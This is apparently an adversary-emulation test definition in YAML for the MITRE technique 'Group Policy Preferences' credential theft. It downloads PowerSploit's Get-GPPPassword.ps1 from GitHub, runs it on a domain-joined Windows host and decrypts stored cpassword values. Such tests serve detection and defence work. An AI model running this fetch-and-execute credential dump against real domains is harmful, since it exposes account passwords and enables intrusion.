api_version: "2.0"
name: GPP Passwords (Get-GPPPassword)
description: |
    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
    This test is intended to be run from a domain joined workstation, not on the Domain Controller itself.
    The Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.

    Successful test execution will either display the credentials found in the GPP files or indicate "No preference files found".
args:
    - name: gpp_script_url
      type: string
      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1
    - name: gpp_script_path
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\Get-GPPPassword.ps1
uuid: e9584f82-322c-474a-b831-940fd8b4455c
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1552: Unsecured Credentials'
    subtechniques:
        - 'T1552.006: Group Policy Preferences'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}
      inline: |
        if(Test-Path "#{gpp_script_path}") {exit 0 } else {{New-Item -ItemType Directory (Split-Path "#{gpp_script_path}") -Force | Out-Null
        Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
        } }
      executor: powershell
    - name: |
        Computer must be domain joined
      inline: |
        if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {{Write-Host Joining this computer to a domain must be done manually
        }}
      executor: powershell
    - name: gpp-passwords-(get-gpppassword)
      inline: |
        . "{{.Args.gpp_script_path}}"
        Get-GPPPassword -Verbose
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
